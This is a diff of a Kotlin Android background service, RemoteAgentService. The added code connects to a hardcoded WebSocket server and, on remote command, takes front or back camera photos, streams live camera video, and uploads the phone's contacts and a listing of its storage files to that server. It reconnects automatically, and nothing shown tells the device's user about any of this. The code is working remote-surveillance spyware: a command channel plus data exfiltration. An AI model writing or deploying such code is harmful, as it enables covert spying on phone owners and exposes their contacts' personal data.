@@ -30,17 +30,221 @@ import android.provider.ContactsContract
 import com.google.gson.Gson
 import java.io.PipedInputStream
 import java.io.PipedOutputStream
+import org.java_websocket.client.WebSocketClient
+import org.java_websocket.handshake.ServerHandshake
+import org.json.JSONObject
+import java.net.URI
+import android.os.Looper
+import okhttp3.OkHttpClient
+import java.net.HttpURLConnection
+import java.net.URL
+import okhttp3.Request
+import okhttp3.Response
+import okhttp3.WebSocket
+import okhttp3.WebSocketListener
+import okio.ByteString
+import java.io.ByteArrayOutputStream
+import android.Manifest
+
 
 
 class RemoteAgentService : Service() {
 
     private lateinit var server: NanoHTTPD
 
+    private var wsClient: WebSocketClient? = null
+    private val deviceId = "android-device-001" // give a unique ID per device
+
+
     override fun onCreate() {
         super.onCreate()
         startForeground(1, createNotification())
         startServer()
+        connectWebSocket()
     }
+
+    private fun connectWebSocket() {
+        try {
+            val serverUri = URI("ws://192.168.31.50:3003/ws") // Node.js WebSocket server
+            wsClient = object : WebSocketClient(serverUri) {
+                override fun onOpen(handshakedata: ServerHandshake?) {
+                    println("✅ Connected to WebSocket server")
+                    val registerMsg = """{"type":"hello","deviceId":"$deviceId"}"""
+                    send(registerMsg)
+                }
+
+                override fun onMessage(message: String?) {
+                    if (message == null) return
+                    println("📩 Message from server: $message")
+
+                    try {
+                        val json = JSONObject(message)
+                        val command = json.optString("type")
+                        val which = json.optString("which", "")
+
+                        when (command) {
+                            "capture" -> handleCapture(which)
+                            "video" -> handleVideo(which)
+                            "contacts" -> handleContactsUpload()
+                            "files" -> handleFileUpload()
+                            "ping" -> wsClient?.send("{\"type\":\"pong\",\"deviceId\":\"$deviceId\"}")
+                            else -> println("⚠️ Unknown command: $command")
+                        }
+                    } catch (e: Exception) {
+                        e.printStackTrace()
+                    }
+                }
+
+
+                override fun onClose(code: Int, reason: String?, remote: Boolean) {
+                    println("❌ WebSocket closed: $reason")
+                    reconnectWebSocket()
+                }
+
+                override fun onError(ex: Exception?) {
+                    println("⚠️ WebSocket error: ${ex?.message}")
+                    reconnectWebSocket()
+                }
+            }
+            wsClient?.connect()
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+    }
+
+
+    private fun reconnectWebSocket() {
+        Handler(Looper.getMainLooper()).postDelayed({
+            println("🔁 Reconnecting WebSocket…")
+            connectWebSocket()
+        }, 5000)
+    }
+
+    private fun getContactsJson(): String {
+        val contactsList = mutableListOf<Map<String, String>>()
+        val cursor = contentResolver.query(
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            arrayOf(
+                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                ContactsContract.CommonDataKinds.Phone.NUMBER
+            ),
+            null, null, null
+        )
+
+        cursor?.use {
+            while (it.moveToNext()) {
+                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
+                val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
+                contactsList.add(mapOf("name" to name, "number" to number))
+            }
+        }
+        return Gson().toJson(contactsList)
+    }
+
+
+    private fun handleCapture(which: String) {
+        val cameraList = when (which) {
+            "front" -> listOf(CameraCharacteristics.LENS_FACING_FRONT)
+            "back" -> listOf(CameraCharacteristics.LENS_FACING_BACK)
+            "both" -> listOf(
+                CameraCharacteristics.LENS_FACING_FRONT,
+                CameraCharacteristics.LENS_FACING_BACK
+            )
+            else -> listOf(CameraCharacteristics.LENS_FACING_BACK)
+        }
+
+        Thread {
+            for (facing in cameraList) {
+                try {
+                    val response = captureCameraImage(facing)
+                    val bytes = response.data?.readBytes()
+                    if (bytes != null) {
+                        val whichStr =
+                            if (facing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "back"
+                        val url = URL("http://192.168.31.50:3003/capture?which=$whichStr")
+                        val conn = url.openConnection() as HttpURLConnection
+                        conn.requestMethod = "POST"
+                        conn.doOutput = true
+                        conn.setRequestProperty("Content-Type", "image/jpeg")
+                        conn.outputStream.use { it.write(bytes) }
+                        conn.responseCode
+                        conn.disconnect()
+                        println("📤 Uploaded $whichStr image")
+                    }
+                } catch (ex: Exception) {
+                    ex.printStackTrace()
+                    wsClient?.send("{\"status\":\"upload_failed\",\"error\":\"${ex.message}\"}")
+                }
+            }
+        }.start()
+    }
+
+    private fun handleVideo(which: String) {
+        val facing = if (which == "front") CameraCharacteristics.LENS_FACING_FRONT
+        else CameraCharacteristics.LENS_FACING_BACK
+        println("🎥 Starting video stream from ${if (which == "front") "front" else "back"} camera")
+        streamCameraVideo(facing)
+    }
+
+    private fun handleContactsUpload() {
+        val contactsJson = getContactsJson()
+        Thread {
+            try {
+                val url = URL("http://192.168.31.50:3003/contacts")
+                val conn = (url.openConnection() as HttpURLConnection).apply {
+                    requestMethod = "POST"
+                    doOutput = true
+                    setRequestProperty("Content-Type", "application/json")
+                }
+                val jsonBody = """{"deviceId":"$deviceId","contacts":$contactsJson}"""
+                conn.outputStream.use { it.write(jsonBody.toByteArray()) }
+                println("📤 Contacts uploaded: ${conn.responseCode}")
+                wsClient?.send("{\"status\":\"contacts_uploaded\",\"deviceId\":\"$deviceId\"}")
+            } catch (ex: Exception) {
+                ex.printStackTrace()
+                wsClient?.send("{\"status\":\"contacts_failed\",\"error\":\"${ex.message}\"}")
+            }
+        }.start()
+    }
+
+    private fun handleFileUpload() {
+        val baseDir = Environment.getExternalStorageDirectory()
+        val files = baseDir.listFiles()?.map {
+            mapOf("name" to it.name, "path" to it.absolutePath, "isDir" to it.isDirectory)
+        } ?: emptyList()
+
+        val jsonBody = Gson().toJson(mapOf("deviceId" to deviceId, "files" to files))
+
+        Thread {
+            try {
+                val url = URL("http://192.168.31.50:3003/files")
+                val conn = (url.openConnection() as HttpURLConnection).apply {
+                    requestMethod = "POST"
+                    doOutput = true
+                    setRequestProperty("Content-Type", "application/json")
+                }
+                conn.outputStream.use { it.write(jsonBody.toByteArray()) }
+                conn.responseCode
+                println("📂 File list uploaded")
+            } catch (ex: Exception) {
+                ex.printStackTrace()
+            }
+        }.start()
+    }
+
+
+
+
+
+
+
+
+
+
+
+//    ----------------------------------------------------------------------------------
+
+
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         // If service is killed by the system, restart it
@@ -66,8 +270,8 @@ class RemoteAgentService : Service() {
                     session.uri.startsWith("/files") -> handleFileList(session)
                     session.uri == "/capture/front" -> captureCameraImage(CameraCharacteristics.LENS_FACING_FRONT)
                     session.uri == "/capture/back" -> captureCameraImage(CameraCharacteristics.LENS_FACING_BACK)
-                    session.uri == "/video/front" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_FRONT)
-                    session.uri == "/video/back" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_BACK)
+//                    session.uri == "/video/front" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_FRONT)
+//                    session.uri == "/video/back" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_BACK)
                     session.uri == "/contacts" -> getContacts()
                     session.uri == "/status" -> newFixedLengthResponse("OK: ${System.currentTimeMillis()}")
                     else -> newFixedLengthResponse(
@@ -212,111 +416,101 @@ class RemoteAgentService : Service() {
             NanoHTTPD.newFixedLengthResponse(NanoHTTPD.Response.Status.INTERNAL_ERROR, "text/plain", "Failed to capture image")
     }
 
-    private fun streamCameraVideo(lensFacing: Int): NanoHTTPD.Response {
-        // Check CAMERA permission
-        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
+
+    private fun streamCameraVideo(lensFacing: Int) {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
             != PackageManager.PERMISSION_GRANTED
         ) {
-            return NanoHTTPD.newFixedLengthResponse(
-                NanoHTTPD.Response.Status.FORBIDDEN,
-                "text/plain",
-                "Camera permission not granted"
-            )
+            println("❌ Camera permission not granted")
+            return
         }
 
-        val pipeInput = PipedInputStream()
-        val pipeOutput = PipedOutputStream(pipeInput)
-
-        // Start background thread for streaming
-        Executors.newSingleThreadExecutor().execute {
-            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
-            val handlerThread = HandlerThread("MJPEGCameraThread").apply { start() }
-            val handler = Handler(handlerThread.looper)
-
-            try {
-                val cameraId = cameraManager.cameraIdList.first { id ->
-                    val chars = cameraManager.getCameraCharacteristics(id)
-                    chars.get(CameraCharacteristics.LENS_FACING) == lensFacing
-                }
-
-                val reader = ImageReader.newInstance(320, 240, ImageFormat.JPEG, 2)
-
-                val stateCallback = object : CameraDevice.StateCallback() {
-                    override fun onOpened(camera: CameraDevice) {
-                        try {
-                            val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
-                            request.addTarget(reader.surface)
-
-                            camera.createCaptureSession(listOf(reader.surface),
-                                object : CameraCaptureSession.StateCallback() {
-                                    override fun onConfigured(session: CameraCaptureSession) {
-                                        reader.setOnImageAvailableListener({ r ->
-                                            val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
-                                            val buffer = img.planes[0].buffer
-                                            val bytes = ByteArray(buffer.remaining())
-                                            buffer.get(bytes)
-                                            img.close()
-
-                                            try {
-                                                pipeOutput.write("--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ${bytes.size}\r\n\r\n".toByteArray())
-                                                pipeOutput.write(bytes)
-                                                pipeOutput.write("\r\n".toByteArray())
-                                                pipeOutput.flush()
-                                            } catch (_: Exception) {
-                                                camera.close()
-                                                handlerThread.quitSafely()
-                                            }
-                                        }, handler)
-
-                                        session.setRepeatingRequest(request.build(), null, handler)
-                                    }
-
-                                    override fun onConfigureFailed(session: CameraCaptureSession) {
-                                        session.close()
-                                        camera.close()
-                                        handlerThread.quitSafely()
-                                    }
-                                }, handler
-                            )
-                        } catch (se: SecurityException) {
-                            se.printStackTrace()
-                            pipeOutput.close()
-                            handlerThread.quitSafely()
-                        }
-                    }
-
-                    override fun onDisconnected(camera: CameraDevice) {
-                        camera.close()
-                        handlerThread.quitSafely()
-                    }
-
-                    override fun onError(camera: CameraDevice, error: Int) {
-                        camera.close()
-                        handlerThread.quitSafely()
-                    }
-                }
-
-                try {
-                    cameraManager.openCamera(cameraId, stateCallback, handler)
-                } catch (se: SecurityException) {
-                    se.printStackTrace()
-                    pipeOutput.close()
-                }
-
-            } catch (e: Exception) {
-                e.printStackTrace()
-                pipeOutput.close()
-                handlerThread.quitSafely()
+        val wsUrl = "ws://192.168.31.50:3003/ws" // 🔹 change to your Node.js server IP
+        val client = OkHttpClient()
+        val request = Request.Builder().url(wsUrl).build()
+        val ws = client.newWebSocket(request, object : WebSocketListener() {
+            override fun onOpen(webSocket: WebSocket, response: Response) {
+                println("📡 Connected to Node.js WS")
+                webSocket.send("""{"type":"video_stream","deviceId":"android-device-001"}""")
             }
-        }
 
-        // Return the InputStream to NanoHTTPD for chunked response
-        return NanoHTTPD.newChunkedResponse(
-            NanoHTTPD.Response.Status.OK,
-            "multipart/x-mixed-replace; boundary=frame",
-            pipeInput
-        )
+            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
+                println("❌ WebSocket failed: ${t.message}")
+            }
+        })
+
+        val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
+        val handlerThread = HandlerThread("VideoStreamThread").apply { start() }
+        val handler = Handler(handlerThread.looper)
+
+        try {
+            val cameraId = cameraManager.cameraIdList.first { id ->
+                val chars = cameraManager.getCameraCharacteristics(id)
+                chars.get(CameraCharacteristics.LENS_FACING) == lensFacing
+            }
+
+            val reader = ImageReader.newInstance(320, 240, ImageFormat.JPEG, 2)
+
+            val stateCallback = object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    try {
+                        val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
+                        request.addTarget(reader.surface)
+
+                        camera.createCaptureSession(listOf(reader.surface),
+                            object : CameraCaptureSession.StateCallback() {
+                                override fun onConfigured(session: CameraCaptureSession) {
+                                    reader.setOnImageAvailableListener({ r ->
+                                        val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
+                                        val buffer = img.planes[0].buffer
+                                        val bytes = ByteArray(buffer.remaining())
+                                        buffer.get(bytes)
+                                        img.close()
+
+                                        try {
+                                            ws.send(ByteString.of(*bytes)) // 🔹 send raw JPEG frame
+                                        } catch (e: Exception) {
+                                            println("⚠️ WS send failed: ${e.message}")
+                                            camera.close()
+                                            handlerThread.quitSafely()
+                                        }
+                                    }, handler)
+
+                                    session.setRepeatingRequest(request.build(), null, handler)
+                                }
+
+                                override fun onConfigureFailed(session: CameraCaptureSession) {
+                                    session.close()
+                                    camera.close()
+                                    handlerThread.quitSafely()
+                                }
+                            }, handler
+                        )
+                    } catch (e: Exception) {
+                        e.printStackTrace()
+                        handlerThread.quitSafely()
+                    }
+                }
+
+                override fun onDisconnected(camera: CameraDevice) {
+                    camera.close()
+                    handlerThread.quitSafely()
+                }
+
+                override fun onError(camera: CameraDevice, error: Int) {
+                    camera.close()
+                    handlerThread.quitSafely()
+                }
+            }
+
+            cameraManager.openCamera(cameraId, stateCallback, handler)
+        } catch (e: Exception) {
+            e.printStackTrace()
+            handlerThread.quitSafely()
+        }
     }
+
+
 
     private fun getContacts(): NanoHTTPD.Response {
         if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS)
